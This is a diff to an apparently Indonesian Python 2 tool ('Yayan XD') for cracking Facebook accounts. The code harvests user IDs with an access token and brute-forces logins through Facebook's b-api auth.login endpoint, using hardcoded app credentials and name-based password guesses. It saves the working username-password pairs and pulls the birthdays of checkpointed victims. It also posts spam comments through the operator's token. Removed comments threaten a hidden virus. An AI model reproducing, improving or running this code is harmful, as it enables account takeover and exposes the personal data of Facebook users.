@@ -3,14 +3,9 @@
 # code by Yayan XD
 # my facebook ( https://www.facebook.com/KM39453 )
 
-#               Open source code
-
 #      (C) Copyright 407 Authentic Exploit
 #      Rebuild Copyright Can't make u real programmer:)
 #      Coded By Yayan XD.
-
-# Jangan di recode bro ada virus yang tersembunyi.
-# jika anda ketahuan merecode ulang, sama saya tidak akan segan" untuk menghidupkan virusnya..
 
 import os
 try:
@@ -31,15 +26,13 @@ except ImportError:
     print '\n [×] Modul Bs4 belum terinstall!...\n'
     os.system('pip2 install bs4')
 
-import requests, sys, bs4, os, random, time, re, json
+import requests, os, re, bs4, sys, json, time, random, datetime
 from concurrent.futures import ThreadPoolExecutor as YayanGanteng
-from requests.exceptions import ConnectionError
-from bs4 import BeautifulSoup
 from datetime import datetime
-from time import sleep
+from bs4 import BeautifulSoup
 ct = datetime.now()
 n = ct.month
-bulan1 = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
+bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
 try:
     if n < 0 or n > 12:
         exit()
@@ -51,24 +44,9 @@ current = datetime.now()
 ta = current.year
 bu = current.month
 ha = current.day
-op = bulan1[nTemp]
+op = bulan[nTemp]
 reload(sys)
 sys.setdefaultencoding('utf-8')
-bulan = {
-        "01": "Januari",
-        "02": "Februari",
-        "03": "Maret",
-        "04": "April",
-        "05": "Mei",
-        "06": "Juni",
-        "07": "Juli",
-        "08": "Agustus",
-        "09": "September",
-        "10": "November",
-        "11": "Oktober",
-        "12": "Desember"
-}
-
 ### WARNA RANDOM ###
 P = '\x1b[1;97m' # PUTIH
 M = '\x1b[1;91m' # MERAH
@@ -92,6 +70,8 @@ loop = 0
 xi_jimpinx = '1714000985456399'
 koh = '100005395413800'
 hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Lo ngentod:v', 'Never surrentod tekentod kentod:v'])
+bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
+
 # lempankkkkkkkk
 def jalan(z):
     for e in z + '\n':
@@ -124,7 +104,6 @@ def hasil(ok,cp):
     else:
         print '\n\n [%s!%s] opshh kamu tidak mendapatkan hasil :('%(M,N);exit()
 
-
 #masuk token
 def yayanxd():
     os.system('clear')
@@ -153,18 +132,19 @@ def yayanxd():
         print '\n\n %s[%s!%s] token invalid'%(N,M,N);time.sleep(2);yayanxd()
 
 
+
 ### ORANG GANTENG ###
 def moch_yayan():
     os.system('clear')
     try:
     	kontol = open('.ppk/.memek.txt', 'r').read()
-    except (KeyError,IOError):
-        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
+    except IOError:
+        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .ppk/.memek.txt');yayanxd()
     try:
         req = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol))
         get = json.loads(req.text)
         nama = get['name']
-    except (KeyError,IOError):
+    except KeyError:
         print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .ppk/.memek.txt');yayanxd()
     except requests.exceptions.ConnectionError:
         exit('\n\n %s[%s!%s] tidak ada koneksi\n'%(N,M,N))
@@ -201,35 +181,25 @@ def moch_yayan():
     elif pepek in['6','06']:
         cek_ingfo(kontol)
     elif pepek in['7','07']:
-        print '\n %s[%s1%s] Check hasil OK'%(N,O,N)
-        print ' %s[%s2%s] Check hasil CP'%(N,O,N)
-        memek = raw_input("\n %s[%s?%s] Choose : "%(N,K,N))
-        if memek =='':
-            print '\n %s[%s×%s] jangan kosong bro '%(N,M,N);time.sleep(1);moch_yayan()
-        elif memek in['1','01']:
-            try:
-                totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
-                print("\n %s[%s#%s] --------------------------------------------"%(N,O,N))
-                print(" [%s+%s] Hasil %sOK%s pada tanggal %s: %s%s-%s-%s%s total %s: %s%s%s\n"%(H,N,H,N,M,H,ha,op,ta,N,M,H,len(totalok),H))
-                os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
-                print("\n %s[%s#%s] --------------------------------------------"%(N,O,N))
-                raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
-            except (KeyError,IOError):
-                print("\n %s[%s×%s] opshh kamu tidak mendapatkan hasil ok :("%(N,M,N))
-                raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
-        elif memek in['2','02']:
-            try:
-                totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
-                print("\n %s[%s#%s] --------------------------------------------"%(N,O,N))
-                print(" [%s×%s] Hasil %sCP%s pada tanggal %s: %s%s-%s-%s%s total %s: %s%s%s\n"%(K,N,K,N,M,K,ha,op,ta,N,M,K,len(totalcp),K))
-                os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
-                print("\n %s[%s#%s] --------------------------------------------"%(N,O,N))
-                raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
-            except (KeyError,IOError):
-                print("\n %s[%s×%s] opshh kamu tidak mendapatkan hasil cp :("%(N,M,N))
-                raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
-        else:
-            print '\n %s[%s×%s] input yang bener'%(N,M,N);time.sleep(1);moch_yayan()
+        try:
+            dirs = os.listdir("dump")
+            print '\n [ hasil crack yang tersimpan di file anda ]\n'
+            for file in dirs:
+                print(" [%s+%s] %s"%(O,N,file))
+            file = raw_input("\n [%s?%s] masukan nama file :%s "%(M,N,H))
+            if file == "":
+                file = raw_input("\n [%s?%s] masukan nama file :%s %s"%(M,N,H,N))
+            total = open("results/%s"%(file)).read().splitlines()
+            print(" %s[%s#%s] --------------------------------------------"%(N,O,N))
+            nm_file = ("%s"%(file)).replace("-", " ")
+            hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "")
+            print(" [%s×%s] Hasil %scrack%s pada tanggal %s:%s%s%s total %s: %s%s%s\n"%(O,N,O,N,M,O,hps_nm,N,M,O,len(total),O))
+            os.system("cat results/%s"%(file))
+            print("\n %s[%s#%s] --------------------------------------------"%(N,O,N))
+            raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+        except (IOError):
+            print("\n %s[%s×%s] opshh kamu tidak mendapatkan hasil :("%(N,M,N))
+            raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
     elif pepek in['8','08']:
         seting_yntkts()
     elif pepek in['9','09']:
@@ -261,7 +231,6 @@ def wuhan(kontol):
         requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,kentod))
     except:
     	pass
-
 # dump id dari teman hehe
 def teman(kontol):
     try:
@@ -387,19 +356,19 @@ def postingan(kontol):
 
 # cek ingfo
 def cek_ingfo(kontol):
-    user = raw_input("\n [%s+%s] masukan id atau username : "%(O,N))
-    url = ("https://lookup-id.com/")
-    if "facebook" in user:
-        payload = {"fburl": user, "check": "Lookup"}
-    else:
-        payload = {"fburl": "https://free.facebook.com/" + user, "check": "Lookup"}
-    halaman = requests.post(url, data = payload).text.encode("utf-8")
-    sop_ = BeautifulSoup(halaman, "html.parser")
-    email_ = sop_.find("span", id = "code")
-    idt = email_.text
-    aww = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt, kontol))
-    x = json.loads(aww.text)
     try:
+        user = raw_input("\n [+] masukan username : ")
+        url = ("https://lookup-id.com/")
+        if "facebook" in user:
+            payload = {"fburl": user, "check": "Lookup"}
+        else:
+            payload = {"fburl": "https://free.facebook.com/" + user, "check": "Lookup"}
+        halaman = requests.post(url, data = payload).text.encode("utf-8")
+        sop_ = BeautifulSoup(halaman, "html.parser")
+        email_ = sop_.find("span", id = "code")
+        idt = email_.text
+        xzx = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt, kontol))
+        x = json.loads(xzx.text)
         nmaa = x['name']
     except (KeyError, IOError):
         nmaa = '%s-%s'%(M,N)
@@ -671,7 +640,7 @@ class __crack__:
 
 
     def __api__(self, user, __yan__):
-        global ok,cp,loop
+        global ok,cp,loop,limit
         sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
         for pw in __yan__:
@@ -682,17 +651,11 @@ class __crack__:
             	_kontol = open('YNTKTS.txt', 'r').read()
             except (KeyError, IOError):
             	_kontol = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/user_agent.txt').text.strip()
-            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)),
-               'x-fb-net-hni': str(random.randint(20000, 40000)),
-               'x-fb-connection-quality': 'EXCELLENT',
-               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
-               'user-agent': _kontol,
-               'content-type': 'application/x-www-form-urlencoded',
-               'x-fb-http-engine': 'Liger'}
+            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": _kontol, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
             api = 'https://b-api.facebook.com/method/auth.login'
             params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
             response = requests.get(api, params=params, headers=headers_)
-            if re.search('(EAAA)\\w+', response.text):
+            if 'access_token' in response.text and 'EAAA' in response.text:
                 print '\r  %s* --> %s|%s                 %s' % (H,user,pw,N)
                 wrt = ' [✓] %s|%s' % (user,pw)
                 ok.append(wrt)
@@ -700,25 +663,8 @@ class __crack__:
                 break
                 continue
             elif 'www.facebook.com' in response.json()['error_msg']:
-                try:
-                    kontol = open('.ppk/.memek.txt').read()
-                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol))
-                    az = json.loads(ak.text)
-                    graph = az["birthday"]
-                    month, day, year = graph.split("/")
-                    month = bulan[month]
-                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
-                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
-                    cp.append(wrt)
-                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
-                    break
-                except (KeyError, IOError):
-                    month = ''
-                    day = ''
-                    year = ''
-                except:
-                    pass
-
+                self.ttl_cp(user, pw)
+                break
                 print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                 wrt = ' [×] %s|%s' % (user,pw)
                 cp.append(wrt)
@@ -754,25 +700,8 @@ class __crack__:
                 break
                 continue
             elif "checkpoint" in ses.cookies.get_dict().keys():
-                try:
-                    kontol = open('.ppk/.memek.txt').read()
-                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol))
-                    az = json.loads(ak.text)
-                    graph = az["birthday"]
-                    month, day, year = graph.split("/")
-                    month = bulan[month]
-                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
-                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
-                    cp.append(wrt)
-                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
-                    break
-                except (KeyError, IOError):
-                    month = ''
-                    day = ''
-                    year = ''
-                except:
-                    pass
-
+                self.ttl_cp(user, pw)
+                break
                 print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                 wrt = ' [×] %s|%s' % (user,pw)
                 cp.append(wrt)
@@ -808,25 +737,8 @@ class __crack__:
                 break
                 continue
             elif "checkpoint" in ses.cookies.get_dict().keys():
-                try:
-                    kontol = open('.ppk/.memek.txt').read()
-                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol))
-                    az = json.loads(ak.text)
-                    graph = az["birthday"]
-                    month, day, year = graph.split("/")
-                    month = bulan[month]
-                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
-                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
-                    cp.append(wrt)
-                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
-                    break
-                except (KeyError, IOError):
-                    month = ''
-                    day = ''
-                    year = ''
-                except:
-                    pass
-
+                self.ttl_cp(user, pw)
+                break
                 print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                 wrt = ' [×] %s|%s' % (user,pw)
                 cp.append(wrt)
@@ -835,6 +747,23 @@ class __crack__:
                 continue
 
         loop += 1
+
+
+    def ttl_cp(self, user, pw):
+        try:
+            kontol = open('.ppk/.memek.txt').read()
+            cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
+            month, day, year = cp_ttl.split('/')
+            month = bulan_ttl[month]
+            print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
+            wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
+            cp.append(wrt)
+            open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
+        except (KeyError, IOError):
+            month = ''
+            day   = ''
+            year  = ''
+        except:pass
 
 
     def __pler__(self):
@@ -857,21 +786,21 @@ class __crack__:
                             ]
                         elif len(xz) == 2:
                             raimuuu = [
-                                xz[0]+'123', xz[0]+'12345',
-                                xz[1]+'123', xz[1]+'12345',
+                                xz[0], xz[0]+'123', xz[0]+'12345',
+                                xz[1], xz[1]+'123', xz[1]+'12345',
                             ]
                         elif len(xz) == 3:
                             raimuuu = [
-                                xz[0]+'123', xz[0]+'12345',
-                                xz[1]+'123', xz[1]+'12345',
-                                xz[2]+'123', xz[2]+'12345',
+                                xz[0], xz[0]+'123', xz[0]+'12345',
+                                xz[1], xz[1]+'123', xz[1]+'12345',
+                                xz[2], xz[2]+'123', xz[2]+'12345',
                             ]
                         elif len(xz) == 4:
                             raimuuu = [
-                                xz[0]+'123', xz[0]+'12345',
-                                xz[1]+'123', xz[1]+'12345',
-                                xz[2]+'123', xz[2]+'12345',
-                                xz[3]+'123', xz[3]+'12345',
+                                xz[0], xz[0]+'123', xz[0]+'12345',
+                                xz[1], xz[1]+'123', xz[1]+'12345',
+                                xz[2], xz[2]+'123', xz[2]+'12345',
+                                xz[3], xz[3]+'123', xz[3]+'12345',
                             ]
                         else:
                             raimuuu = [
@@ -900,21 +829,21 @@ class __crack__:
                             ]
                         elif len(xz) == 2:
                             raimuuu = [
-                                xz[0]+'123', xz[0]+'12345',
-                                xz[1]+'123', xz[1]+'12345',
+                                xz[0], xz[0]+'123', xz[0]+'12345',
+                                xz[1], xz[1]+'123', xz[1]+'12345',
                             ]
                         elif len(xz) == 3:
                             raimuuu = [
-                                xz[0]+'123', xz[0]+'12345',
-                                xz[1]+'123', xz[1]+'12345',
-                                xz[2]+'123', xz[2]+'12345',
+                                xz[0], xz[0]+'123', xz[0]+'12345',
+                                xz[1], xz[1]+'123', xz[1]+'12345',
+                                xz[2], xz[2]+'123', xz[2]+'12345',
                             ]
                         elif len(xz) == 4:
                             raimuuu = [
-                                xz[0]+'123', xz[0]+'12345',
-                                xz[1]+'123', xz[1]+'12345',
-                                xz[2]+'123', xz[2]+'12345',
-                                xz[3]+'123', xz[3]+'12345',
+                                xz[0], xz[0]+'123', xz[0]+'12345',
+                                xz[1], xz[1]+'123', xz[1]+'12345',
+                                xz[2], xz[2]+'123', xz[2]+'12345',
+                                xz[3], xz[3]+'123', xz[3]+'12345',
                             ]
                         else:
                             raimuuu = [
@@ -943,21 +872,21 @@ class __crack__:
                             ]
                         elif len(xz) == 2:
                             raimuuu = [
-                                xz[0]+'123', xz[0]+'12345',
-                                xz[1]+'123', xz[1]+'12345',
+                                xz[0], xz[0]+'123', xz[0]+'12345',
+                                xz[1], xz[1]+'123', xz[1]+'12345',
                             ]
                         elif len(xz) == 3:
                             raimuuu = [
-                                xz[0]+'123', xz[0]+'12345',
-                                xz[1]+'123', xz[1]+'12345',
-                                xz[2]+'123', xz[2]+'12345',
+                                xz[0], xz[0]+'123', xz[0]+'12345',
+                                xz[1], xz[1]+'123', xz[1]+'12345',
+                                xz[2], xz[2]+'123', xz[2]+'12345',
                             ]
                         elif len(xz) == 4:
                             raimuuu = [
-                                xz[0]+'123', xz[0]+'12345',
-                                xz[1]+'123', xz[1]+'12345',
-                                xz[2]+'123', xz[2]+'12345',
-                                xz[3]+'123', xz[3]+'12345',
+                                xz[0], xz[0]+'123', xz[0]+'12345',
+                                xz[1], xz[1]+'123', xz[1]+'12345',
+                                xz[2], xz[2]+'123', xz[2]+'12345',
+                                xz[3], xz[3]+'123', xz[3]+'12345',
                             ]
                         else:
                             raimuuu = [
